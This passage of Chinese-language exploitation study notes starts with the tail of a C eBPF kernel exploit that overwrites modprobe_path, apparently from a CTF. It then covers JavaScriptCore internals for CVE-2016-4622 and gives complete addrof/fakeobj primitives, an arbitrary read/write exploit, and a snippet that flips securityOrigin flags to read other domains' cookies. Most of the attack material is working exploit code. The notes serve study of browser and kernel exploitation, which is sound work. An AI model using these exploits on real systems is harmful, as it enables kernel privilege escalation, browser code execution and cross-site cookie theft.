    ctlptr[0] = 2;
    ctlptr[1] = 0xdeadbeef;
    bpf_update_elem(ctlmap_fd, &key, ctlbuf, 0);
    bpf_update_elem(expmap_fd, &key, expbuf, 0);
    
    trig_hook();
    memset(ctlbuf, 0, 0x100);
    bpf_lookup_elem(ctlmap_fd, &key, ctlbuf);

    uint64_t array_map_ops = ctlptr[2];
    uint64_t expmap_bpf_array = ctlptr[3] - 0xc0;
    uint64_t code = array_map_ops - 0x10168c0;
    uint64_t modprobe_path = code + 0x1446d80;
    uint64_t array_map_get_next_key = code + 0x16c3b0;
    info("array_map_ops", array_map_ops);
    info("expmap_bpf_array", expmap_bpf_array);
    info("code", code);
    info("modprobe_path", modprobe_path);

    uint64_t fake_array_map_ops[] =
    {
        code + 0x16c2d0, code + 0x16d070,
        0,               code + 0x16c920,
        code + 0x16c3b0, 0,
        0,               code + 0x155530,
        0,               code + 0x155530,
        0,               code + 0x16c430,
        code + 0x16c810, code + 0x16c3e0,
        0,               0,
        0,               0,
        0,               code + 0x16c6a0,
        0,               code + 0x16c4e0,
        code + 0x16cee0, 0,
        0,               0,
        code + 0x16c340, code + 0x16c370,
        code + 0x16c4b0, 0,
    };
    /**
     * fake_array_map_ops[4] is map_get_next_key (default: array_map_get_next_key)
     * fake_array_map_ops[14] is map_push_elem (default: 0)
     * 
     * and we hijack map_push_elem to map_get_next_key
     */
    
    fake_array_map_ops[14] = fake_array_map_ops[4];

    memcpy(expbuf, (void *) fake_array_map_ops, sizeof(fake_array_map_ops));
    bpf_update_elem(expmap_fd, &key, expbuf, 0);

    ctlptr[0] = 2;
    ctlptr[1] = 1; // hint to hijack array_map_ops
    bpf_update_elem(ctlmap_fd, &key, ctlbuf, 0);
    trig_hook(); /* array_map_get_next_key */

    /**
     * bpf_update_elem(fd, a, b, c) will be
     * array_map_get_next_key(a, b, c)
     */
    expptr[0] = 0x706d742f - 1; // "/tmp"[::-1]
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path);
    expptr[0] = 0x6e77702f - 1; // "/pwn"[::-1]
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path + 4);
    expptr[0] = 0xffffffff; // null
    bpf_update_elem(expmap_fd, &key, expbuf, modprobe_path + 8);
}

int main(int argc, char **argv)
{
    init_proc();
    setup_modprobe_path();
    prep();
    exploit();
    system("/tmp/dummy");
    system("cat /flag");
    return 0;
}
```

- 關鍵在於 `insns` 內部的行為





### CVE-2016-4622 + JavascriptCore 內部機制

#### env / background

- 下載 WebKit 並切到有問題的版本

  ```bash
  git clone git://git.webkit.org/WebKit.git WebKit.git
  git checkout 3af5ce129e6636350a887d01237a65c2fce77823
  ```

- 編譯 debug version 的 JSC

  ```bash
  Tools/Scripts/build-webkit --jsc-only --debug
  ```

  - 我在編譯時會遇到某個檔案的 180 行的 `Handle<JSC::Unknown>` 會是 ambiguous reference，解決方法只要改成 `JSC::Handle<JSC::Unknown>` 即可

- 執行

  ```bash
  ./WebKitBuild/Debug/bin/jsc
  ```

相較 V8，JSC 的編譯速度實在是快很多，可能是因為直接在 MacOS 編譯而不是透過 Docker / Multipass 等等虛擬化技術包裝執行環境。

- 下斷點：

  ```
  lldb> b JSC::mathProtoFuncMax
  ```

- 之後執行 `Math.max(1,2)` 即可在斷點處停止，如果要看前後 source code，可以下：

  ```
  l   // 下 10
  l - // 前 10
  ```

執行過程中，可以使用 `describe(var)` 來看某個變數的詳細資料，輸出結果會像是：

```c
>>> describe([{}, 1, 13.37, [1, 2, 3], "test"])
Object: 0x10b9b4390 with butterfly 0x8000e0038 (Structure 0x10b9f2ae0:[Array, {}, ArrayWithContiguous, Proto:0x10b9c80a0]), StructureID: 99
```

包含：

- Object
  - 4 bytes - struct ID
  - 4 bytes - flags
  - 8 bytes - butterfly
  - 10 bytes ... - inline property
- butterfly
  - 8 bytes 為單位
- Structure
- Proto
- Structure ID

也能使用 `p *(JSC::JSObect*)` 印出對應 memory 其 `JSObject` 的架構

而 JSC 會根據 array element 的不同，決定 array element 的型態，像是以下 case，連第一個 Int 也被轉成 Double：

```
>>> describe([1337])
Object: 0x10b9b43a0 with butterfly 0x8000dc010 (Structure 0x10b9f2c30:[Array, {}, CopyOnWriteArrayWithInt32, Proto:0x10b9c80a0, Leaf]), StructureID: 102

>>> describe([1337,13.37])
Object: 0x10b9b43b0 with butterfly 0x8000dc030 (Structure 0x10b9f2ca0:[Array, {}, CopyOnWriteArrayWithDouble, Proto:0x10b9c80a0, Leaf]), StructureID: 103
```

JavascriptCore 內部儲存資料的方式都是以 8 bytes 為單位，而對於不同 type 有不同的存法，參考 [JSCJSValue src](https://github.com/WebKit/webkit/blob/main/Source/JavaScriptCore/runtime/JSCJSValue.h)：

```c
     * The top 15-bits denote the type of the encoded JSValue:
     *
     *     Pointer {  0000:PPPP:PPPP:PPPP
     *              / 0002:****:****:****
     *     Double  {         ...
     *              \ FFFC:****:****:****
     *     Integer {  FFFE:0000:IIII:IIII
     ...
          * The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
     * null and undefined values are represented by specific, invalid pointer values:
     *
     *     False:     0x06
     *     True:      0x07
     *     Undefined: 0x0a
     *     Null:      0x02
```

並且在儲存眾多資料時，有一個特別的儲存方法稱作 **Butterfly**，意即某個 object 指向某塊記憶體空間時，上下分別會儲存不同的資料，像是一個蝴蝶一樣：

```
--------------------------------------------------------
.. | propY | propX | length | elem0 | elem1 | elem2 | ..
--------------------------------------------------------
                            ^
                            |
            +---------------+
            |
  +-------------+
  | Some Object |
  +-------------+
```

- array element 會被存在 pointer 的下面
- array length 以及 property 會被存在前面

而 property 也有可能直接存在 `Object` 底下 `0xbadbeef0` 的部分 (inline object)，但是在超過一定大小 (6) 後還是會把多的 element 用 butterfly 來存，不過此時 Object 仍然有東西 (1~6 的 element value)。有關儲存方式更詳細的 layout：

```
            +------------------------------------------+
            |                Butterfly                 |
            | baz | bar | foo | length: 2 | 42 | 13.37 |
            +------------------------------------------+
                                          ^
                                +---------+
               +----------+     |
               |          |     |
            +--+  JSCell  |     |      +-----------------+
            |  |          |     |      |                 |
            |  +----------+     |      |  MethodTable    |
            |       /\          |      |                 |
 References |       || inherits |      |  Put            |
   by ID in |  +----++----+     |      |  Get            |
  structure |  |          +-----+      |  Delete         |
      table |  | JSObject |            |  VisitChildren  |
            |  |          |<-----      |  ...            |
            |  +----------+     |      |                 |
            |       /\          |      +-----------------+
            |       || inherits |                  ^
            |  +----++----+     |                  |
            |  |          |     | associated       |
            |  | JSArray  |     | prototype        |
            |  |          |     | object           |
            |  +----------+     |                  |
            |                   |                  |
            v                   |          +-------+--------+
        +-------------------+   |          |   ClassInfo    |
        |    Structure      +---+      +-->|                |
        |                   |          |   |  Name: "Array" |
        | property: slot    |          |   |                |
        |     foo : 0       +----------+   +----------------+
        |     bar : 1       |
        |     baz : 2       |
        |                   |
        +-------------------+
```

JSC 的 JIT 分成多個不同層級：

- tier 1: the LLInt interpreter - 預設
- tier 2: the Baseline JIT compiler
  - hot code
  - statement in function 執行超過 100 次 or function 執行超過 6 次
- tier 3: the DFG JIT
  - statement in function 執行超過 1000 次 or function 執行超過 66 次
  - Data Flow Graph，但是會先 converting bytecode into the **DFG CPS form**
    - *CPS* (Continuation-Passing Style) 不會 return 而是直接將結果傳給下個 function
    - 產生的 DFG 可以呈現變數跟臨時變數之間的關係 (data flow relation)
- tier 4: the FTL JIT (now with our new B3 backend)
  - faster than light
  - 使用 compiler backend LLVM
  - **The FTL JIT is designed to bring aggressive C-like optimizations to JavaScript**

如果想觀察 JSC 在 JIT 時產生的 assembly code 或是其他更詳細的資訊，可以參考以下兩篇文章：

- https://webkit.org/blog/6411/javascriptcore-csi-a-crash-site-investigation-story/
- https://webkit.org/blog/3362/introducing-the-webkit-ftl-jit/
- 可以在執行前加上環境變數來改變執行時的行為，而如查看 JIT 產生的 asm 就可以加上 `env JSC_dumpDisassembly=true`

對於 JIT，type confusion 是一個很常見的漏洞，而從開發者的角度來看，JIT compiler 必須要注意：

- free of side-effect
- has effects on data
- 需要注意 JITed code 是否有改變 object layout 的可能，可參考：https://www.zerodayinitiative.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons

**On Stack Replacement (OSR)** - a technique for switching between different implementations of the same function

- you could use OSR to switch **from interpreted or unoptimized code** to **JITed code** as soon as it finishes compiling
- When OSR occurs, the **VM is paused**, and the stack frame for the target function is **replaced by an equivalent frame** which may have variables in different locations
- OSR 也有可能 **from optimized code** to **unoptimized code or interpreted code**
  - 情況可能發生在 JIT 的 assumptions 是錯的，實際 function 的行為可能不如預期，此時就可以 fallback
- [more OSR detail](https://stackoverflow.com/a/9105846)

JIT 的過程：

1. define function

   ```c
   >>> function x(meow) { var a = meow*3; return meow/2 + a; }
   Generated JIT code for LLInt program prologue thunk:
       Code at [0x5316d2c01820, 0x5316d2c01840):
         0x5316d2c01820: mov $0x1012c1cc0, %rax
         0x5316d2c0182a: jmp *%rax
         0x5316d2c0182c: int3
         0x5316d2c0182d: int3
         0x5316d2c0182e: int3
   ```

2. 0x50 次 (Baseline)

   ```c
   Generated Baseline JIT code for <global>#AQs9DO:[0x10ba5c8c0->0x10ba64200, BaselineGlobal, 119], instruction count = 119
      Source: for (var i = 0; i < 0x500; i++) x(15)
      Code at [0x5316d2c02540, 0x5316d2c02e80):
             0x5316d2c02540: push %rbp
             0x5316d2c02541: mov %rsp, %rbp
             0x5316d2c02544: mov $0x10ba5c8c0, %r11
             0x5316d2c0254e: mov %r11, 0x10(%rbp)
             0x5316d2c02552: lea -0x80(%rbp), %rsi
             0x5316d2c02556: mov $0x106d13130, %r11
             0x5316d2c02560: cmp %rsi, (%r11)
             0x5316d2c02563: ja 0x5316d2c02d95
             0x5316d2c02569: mov %rsi, %rsp
               ...
   ```

3. 0x500 次 (DFG)

   ```c
   >>> Generated DFG JIT code for x#AKIxrP:[0x10ba50690->0x10ba50460->0x10bafcf20, DFGFunctionCall, 27], instruction count = 27:
       Optimized with execution counter = 60.000000/1151.000000, -940
       Code at [0x5316d2c037c0, 0x5316d2c03be0):
             0x5316d2c037c0: push %rbp
             0x5316d2c037c1: mov %rsp, %rbp
             0x5316d2c037c4: mov $0x10ba50690, %r11
             0x5316d2c037ce: mov %r11, 0x10(%rbp)
             0x5316d2c037d2: lea -0x50(%rbp), %rsi
             0x5316d2c037d6: mov $0x106d13130, %r11
             0x5316d2c037e0: cmp %rsi, (%r11)
             0x5316d2c037e3: ja 0x5316d2c03a27
             0x5316d2c037e9: lea -0x40(%rbp), %rsp
             0x5316d2c037ed: test $0xf, %spl
             0x5316d2c037f1: jz 0x5316d2c037fe
             0x5316d2c037f7: mov $0x64, %r11d
             0x5316d2c037fd: int3
             ...
   ```

4. 0x50000 次 (FTL)

   ```c
   ...
   Unwind info for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27]:
   localsOffset = 0 for stack slot: stack0 at 0x106c6feb0
   Generated FTLMode code for x#AKIxrP:[0x10ba508c0->0x10ba50460->0x10bafcf20, FTLFunctionCall, 27], instruction count = 27:
   BB#0: ; frequency = 1.000000
                     0x5316d2c05580: push %rbp
                     0x5316d2c05581: mov %rsp, %rbp
                     0x5316d2c05584: lea -0x30(%rbp), %rsp
   ...
   ```



如果可以在動態改變 object layout，就能造成 type confusion 並且做到 information leak，而開發者的對應方式為：如果該 function 會在動態更新 object，會被 marked 成 dangerous：`clobberWorld()`。

- 像是 `String.ValueOf()` 可能會更改 structure，就是 dangerous (returns the **primitive value of the specified object**)



#### exploit

`addrof`：

```js
function addrof(val) {
    var array = [13.37]; // create array
    var reg = /abc/y; // create regular expression

    // y for sticky:
    // The sticky property reflects whether or not the search is sticky,
    // (searches in strings only from the index indicated by the lastIndex property
    // of this regular expression). sticky is a read-only property of
    // an individual regular expression object
    
    // Target function
    var AddrGetter = function(array) {
        "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }
    
    // Force optimization
    // JIT it !
    for (var i = 0; i < 10000; ++i)
        AddrGetter(array);
    
    // Setup haxx
    // Update array[0] to our target object when regex do lastIndex()
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = val; // set the first element to an object
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    // return first element of array
    return AddrGetter(array);
    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
}

meow = {}
print(describe(meow))
print(addrof(meow))
```

在執行 `JSC_reportDFGCompileTimes=true ./jsc ./pwn.js` 的過程中，第一次的 iteration 會有兩次的 optimization 以及 failed，而他在內部做了兩次 optimization

- to DFG
- to FTL

而在第二次的 iteration，成功印出 address，不過 optimization 只有 to DFG，因此如果降低 force JIT 的迴圈數，就能確保不會到 FTL，至此 exploit 100% 成功。

接著執行 `JSC_dumpSourceAtDFGTime=true ./jsc ./pwn.js` 分析 DFG 內部優化究竟做了些什麼：

```
[1] Compiled AddrGetter#EmYVxR:[0x109850230->0x1098fcf20, BaselineFunctionCall, 46]
'''function AddrGetter(array) {
    "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }'''
```

- 這邊指出要 optimize 哪個部分

```
[2] Inlined match#DLDZSb:[0x109850460->0x1098fd080, BaselineFunctionCall, 112 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0->0x10985
0230->0x1098fcf20, DFGFunctionCall, 46] bc#33
'''function match(regexp)
{
    "use strict";

    if (this == null)
        @throwTypeError("String.prototype.match requires that |this| not be null or undefined");

    if (regexp != null) {
        var matcher = regexp.@matchSymbol; // <--- do this
        if (matcher != @undefined)
            return matcher.@call(regexp, this);
    }

    let thisString = @toString(this);
    let createdRegExp = @regExpCreate(regexp, @undefined);
    return createdRegExp.@matchSymbol(thisString);
}'''
```

- 這邊是 `match()` 的程式邏輯，由於 regexp 不為 null，會執行 `regexp.@matchSymbol`

```
[3] Inlined [Symbol.match]#BFrWhl:[0x109850690->0x1098b9130, BaselineFunctionCall, 119 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGetter#EmYVxR:[0x109850af0
->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#52
'''function [Symbol.match](strArg)
{
    "use strict";

    if (!@isObject(this))
        @throwTypeError("RegExp.prototype.@@match requires that |this| be an Object");

    let str = @toString(strArg);

    //
    if (!@hasObservableSideEffectsForRegExpMatch(this)) // 這邊會檢查是否有 side effect
        return @regExpMatchFast.@call(this, str);
    return @matchSlow(this, str);
}'''
```

- MatchSymbol 會執行 `[Symbol.match](strArg)`，有點怪的 function define
  - js 會執行 `@overriddenName="[Symbol.match]"` 改掉 function name，該 function 原本也叫做 `match()`
- 如果有 side effect 就走 `MatchSlow()`，沒有就走 `Fast.@call`

```
[4] Inlined hasObservableSideEffectsForRegExpMatch#DSRdGE:[0x1098508c0->0x1098bb2e0, BaselineFunctionCall, 106 (ShouldAlwaysBeInlined) (StrictMode)] at AddrGe
tter#EmYVxR:[0x109850af0->0x109850230->0x1098fcf20, DFGFunctionCall, 46] bc#49
'''function hasObservableSideEffectsForRegExpMatch(regexp)
{
    "use strict";

    //
    let regexpExec = @tryGetById(regexp, "exec");
    if (regexpExec !== @regExpBuiltinExec)
        return true;

    let regexpGlobal = @tryGetById(regexp, "global");
    if (regexpGlobal !== @regExpProtoGlobalGetter)
        return true;
    let regexpUnicode = @tryGetById(regexp, "unicode");
    if (regexpUnicode !== @regExpProtoUnicodeGetter)
        return true;

	// patch commit 改成:
	// return typeof regexp.lastIndex !== "number";
	
    return !@isRegExpObject(regexp);
}'''
```

- 這裡檢查是否有 side effect

在 DFG 執行 opcode 時 (Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h)：

```c++
...
2230     case RegExpTest:
2231         // Even if we've proven known input types as RegExpObject and String,
2232         // accessing lastIndex is effectful if it's a global regexp.
2233         clobberWorld();
2234         setNonCellTypeForNode(node, SpecBoolean);
2235         break;
2236
2237     case RegExpMatchFast:
2238         ASSERT(node->child2().useKind() == RegExpObjectUse);
2239         ASSERT(node->child3().useKind() == StringUse || node->child3().useKind() == KnownStringUse);
2240         setTypeForNode(node, SpecOther | SpecArray);
2241         break;
...
```

可以看到 `RegExpTest` 有一則註解，說明 lastIndex 可能會發生問題，不過在 `RegExpMatchFast` 也沒有對資料做更深入的檢查，最後的修補方式是在 `hasObservableSideEffectsForRegExpMatch` 加上更多的檢查，不讓 `RegExpMatchFast `被執行到而走 slow path。



`fakeobj`:

```js
function fakeobj(dbl) {
    var array = [13.37];
    var reg = /abc/y;

    var AddrSetter = function(array) {
        "abc".match(reg);
        array[0] = dbl; // type confusion
    }
    
    for (var i = 0; i < 10000; ++i)
        AddrSetter(array);
    
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = {};
        return "0";
    };
    reg.lastIndex = regexLastIndex;

    AddrSetter(array);
    return array[0]
}
```

- 類似的 payload，不過 `toString()` 換成是將 `array[0]` assign 成 object，並在 JIT code 當中 assign 成傳入的 double value
- 在 `toString()` 時會將原本的 array 從 `ArrayWithDouble` 轉為 `ArrayWithContiguous`，但因為 JIT code 並不會做 type casting，因此 `array[0] = dbl` 會覆蓋掉原本的 pointer 成我們輸入的 double value

```js
fake = {}
// struct.unpack("d", struct.pack("Q", 0x0100160000001000-2**48))
// 2*48 --> for double value encode, but JIT code will not to substract 2**48 (?)
fake.a = 7.082855106403439e-304
fake.b = 2
fake.c = 1337
delete fake.b // set 0
print(addrof(fake))
/* (In python) hax_addr = struct.unpack("Q", struct.pack("d", <address_u_got> + 0x10))
 * hax = fakeobj(hax_addr)
 * describe(hax)
 */
```

- 在 assign pointer 時，double value 會被 encode，方式為額外加上 `2**48` ，因此在 assign 時必須要扣掉 `2**48`
  - 而該情況是在存入的 value type 是 JSCValue 時才會 encode (Array 中有除了 Double 的 type)，如果是純 Double Array 就不用 encode，因此也不用減去 `2**48`
- `delete <var>` 可以讓 `var` 對應的記憶體空間被清為 0
- 到此，可以構造出任意的 JS object，不過要構造出怎樣的 object 才能做到 arbitrary code execution？ 

Linus 在找 structure ID 的方法並非 spray，而是透過 increment struct ID 以及用 `instanceof ` 來檢查是否為 target structure：

```js
while (!(fakeWasmBuffer instanceof WebAssembly.Memory)) {
    jsCellHeader.assignAdd(jsCellHeader, Int64.One);
    wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
}
```

在用 `new BufferArray()` 建立新的 array，並透過 `u32 = new Uint32Array(buf)` 以及 `f64` version，就能直接對 pointer 做操作，不用再透過手動用 python 做 cast:

```js
fake = {}
fake.a = 7.082855106403439e-304
fake.b = 2
fake.c = 1337
delete fake.b // set 0
fake_addr = addrof(fake)
f64[0] = fake_addr
u32[0] += 0x10
hax_addr = f64[0]
hax = fakeobj(hax_addr)
```



而 [Niklas 的 exploit](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html) 利用不同的方式實作了更 powerful 的 `addrof` 以及 `fakeobj` (?)，不過步驟複雜，建議是參考 LiveOverflow 的[說明](https://liveoverflow.com/preparing-for-stage-2-of-a-webkit-exploit/)



https://liveoverflow.com/content/images/2019/07/ov3.gif

Ref to LiveOverflow



1. 建立 ArrayWithContiguous type 的 fake object：

   ```js
   // spray for structureID
   // the type of structure_spray is ArrayWithContiguous
   var structure_spray = [];
   for (var i = 0; i < 1000; i++) {
       var array = [13.37];
       array.a = 13.37;
       array['prop' + i] = 13.37;
       structure_spray.push(array)
   }
   // the type of victim is ArrayWithDouble
   var victim = structure_spray[510];
   
   u32[0] = 0x200; // for structureID
   u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
   var flags_double = f64[0]
   u32[1] = 0x01082009 - 0x10000
   var flags_cont = f64[0]
   
   // NonArray (inline properties)
   var outer = {
       cell_header: flags_cont,
       butterfly: victim,
   }
   
   f64[0] = addrof(outer)
   u32[0] += 0x10
   var hax = fakeobj(f64[0])
   ```

   - 由於 butterfly 指向 victim (實際上是 victim 的 metadata)，因此 hax 可以更動到 victim 的 metadata (cell_header + butterfly)，像是 `hax[0]` 就會是 victim 的 cell_header、`hax[1]` 會是 victim 的 butterfly

2. 構造 boxed / unboxed 擁有相同 butterfly，用 unboxed assign 位置，在用 boxed 作為 pointer 任意存取；也能用 boxed 指向某個 object，並透過 unboxed 讀取 address：

   ```js
   var unboxed_size = 10
   // CopyOnWriteArrayWithDouble
   var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
   unboxed[0] = 13.337 // not we need ArrayWithDouble
   
   var boxed = [{}] // JSCValue
   
   hax[1] = unboxed // change victim butterfly to unboxed metadata
   var tmp_butterfly = victim[1] // get unboxed butterfly
   
   hax[1] = boxed // change victim butterfly to unboxed metadata
   // set boxed butterfly to tmp_butterfly, which is shared with unboxed
   victim[1] = tmp_butterfly
   
   // the idea is same as original reg bug
   
   stage2_addrof = function (obj) {
       boxed[0] = obj;
       return unboxed[0];
   }
   
   stage2_fakeobj = function (addr) {
       unboxed[0] = addr;
       return boxed[0];
   }
   ```

3. 任意讀 / 任意寫並不需要 powerful addrof / fakeobj，只需要使用第一階段的 addrof / fakeobj 即可：

   ```js
   outer.cell_header = flags_double
   read64 = function(where) {
       f64[0] = where;
       u32[0] += 0x10; // .a offset is -0x10
       hax[1] = f64[0];
       return victim.a;
   }
   
   write64 = function(where, what) {
       f64[0] = where;
       u32[0] += 0x10; // .a offset is -0x10
       hax[1] = f64[0];
       victim.a = what;
   }
   ```



最後攻擊方法有許多種：

- 下載 JIT 並且執行，在得到 JIT function 後拿到其 address，由於是 rwx，因此將 JIT 內容蓋寫成 shellcode 即可

  - 不過並不是每個 Webkit 都會有 JIT

- 找到 stack 並蓋寫 return address 成 ROP

- 蓋寫用於避免 XSS 攻擊的 `securityPolicy`，以下 POC 參考原作者的 exploit：

  ```js
  var jsxhr = new XMLHttpRequest();
  var jsxhrAddr = stage2.addrof(jsxhr);
  var xhrAddr = stage2.read64(jsxhrAddr + 0x18);
  var scriptExecContextAddr = stage2.read64(xhrAddr + 0x68);
  var securityOriginPolicyAddr = stage2.read64(scriptExecContextAddr + 8);
  var securityOriginAddr = stage2.read64(securityOriginPolicyAddr + 8);
  
  // m_universalAccess flag is at +0x31, set it to 1
  var flags = stage2.read64(securityOriginAddr + 0x30);
  stage2.write64(securityOriginAddr + 0x30, flags + 0x0100);
  ```

  - 存取到其他 domain 的 cookies



最後 LiveOverflow 提出關於大家都使用 `addrof` 以及 `fakeobj` 作為 exploit primitive 的論點，除了可以構造任意的 JS object 之外，這個方法屬於 **reusable**，考慮到一些 exploit 在做 `gc()` 等操作時並會造成 memory corruption，如果我們找到新的 vuln 可以構造出 `addrof` 以及 `fakeobj`，就可以直接使用過去的 memory safe exploit

- 只需要在新的 vuln 弄到 `addrof()` 以及 `fakeobj()`，其他 exploit 都可以 reuse
- Steps
  1. bug
  2. `addrof` / `fakeobj`
  3. arbitrary r/w
  4. (memory clean)
  5. do stuff ...



最終的 exploit (到 arbitrary r/w)：

```js
function addrof(val) {
    var array = [13.37]; // create array
    var reg = /abc/y; // create regular expression

    // y for sticky:
    // The sticky property reflects whether or not the search is sticky,
    // (searches in strings only from the index indicated by the lastIndex property
    // of this regular expression). sticky is a read-only property of
    // an individual regular expression object
    
    // Target function
    var AddrGetter = function(array) {
        "abc".match(reg); // original: reg[Symbol.match]();
        return array[0];
        /* when it's jited, it will return double value (because of array[0]),
         * but jit doesn't check if array[0] is still a double
         */
    }
    
    // Force optimization
    // JIT it !
    for (var i = 0; i < 10000; ++i)
        AddrGetter(array);
    
    // Setup haxx
    // Update array[0] to our target object when regex do lastIndex()
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = val; // set the first element to an object
        return "0";
    };
    reg.lastIndex = regexLastIndex;
    
    // Do it!
    // return first element of array
    return AddrGetter(array);
    // lastIndex is an object ??! We need to get number from call lastIndex.toString() !
    // Oh! I get "0" and the lastIndex must be 0 --> trigger exp
}


function fakeobj(dbl) {
    var array = [13.37];
    var reg = /abc/y;

    var AddrSetter = function(array) {
        "abc".match(reg);
        array[0] = dbl; // type confusion
    }
    
    for (var i = 0; i < 10000; ++i)
        AddrSetter(array);
    
    regexLastIndex = {};
    regexLastIndex.toString = function() {
        array[0] = {};
        return "0";
    };
    reg.lastIndex = regexLastIndex;

    AddrSetter(array);
    return array[0]
}

for (var i = 0; i < 0x1000; i++) {
    spray = {}
    spray.x = 1
    spray['prop_' + i] = 2
}

buf = new ArrayBuffer(8);
u32 = new Uint32Array(buf);
f64 = new Float64Array(buf);

// spray for structureID
// the type of structure_spray is ArrayWithContiguous
var structure_spray = [];
for (var i = 0; i < 1000; i++) {
    var array = [13.37];
    array.a = 13.37;
    array['prop' + i] = 13.37;
    structure_spray.push(array)
}

/* ---------------- stage 1 ---------------- */
// the type of victim is ArrayWithDouble
var victim = structure_spray[510];

u32[0] = 0x200; // for structureID
u32[1] = 0x01082007 - 0x10000 // why sub 0x10000?
var flags_double = f64[0]
u32[1] = 0x01082009 - 0x10000
var flags_cont = f64[0]

// NonArray (inline array)
var outer = {
    cell_header: flags_cont,
    butterfly: victim,
}

f64[0] = addrof(outer)
u32[0] += 0x10
var hax = fakeobj(f64[0])

/* ---------------- stage 2 ---------------- */
var unboxed_size = 10
// CopyOnWriteArrayWithDouble
var unboxed = eval(`[${'13.37,'.repeat(unboxed_size)}]`)
unboxed[0] = 13.337 // not we need ArrayWithDouble

var boxed = [{}] // JSCValue

hax[1] = unboxed // change victim butterfly to unboxed metadata
var tmp_butterfly = victim[1] // get unboxed butterfly

hax[1] = boxed // change victim butterfly to unboxed metadata
// set boxed butterfly to tmp_butterfly, which is shared with unboxed
victim[1] = tmp_butterfly

// the idea is same as original reg bug

stage2_addrof = function (obj) {
    boxed[0] = obj;
    return unboxed[0];
}

stage2_fakeobj = function (addr) {
    unboxed[0] = addr;
    return boxed[0];
}

outer.cell_header = flags_double
read64 = function(where) {
    f64[0] = where;
    u32[0] += 0x10; // .a offset is -0x10
    hax[1] = f64[0];
    return victim.a;
}

write64 = function(where, what) {
    f64[0] = where;
    u32[0] += 0x10; // .a offset is -0x10
    hax[1] = f64[0];
    victim.a = what;
}
```



資料參考來源：

- [phrack](http://phrack.org/papers/attacking_javascript_engines.html)
- [LiveOverflow](https://liveoverflow.com/topic/browser-exploitation/)
- [WebKit-RegEx-Exploit](https://github.com/LinusHenze/WebKit-RegEx-Exploit)

其他學習資源 (引用 LiveOverflow)：

**JavaScriptCore** - Here are my reasons why I chose this engine.

- [saelo's exploit for CVE-2018-4233](https://github.com/saelo/cve-2018-4233)
  - another implementation by Niklas B - [regexp](https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html)
- [Zero Day Initiative](https://twitter.com/thezdi) - [blog post](https://www.zerodayinitiative.com/blog/2019/3/14/the-apple-bug-that-fell-near-the-webkit-tree)
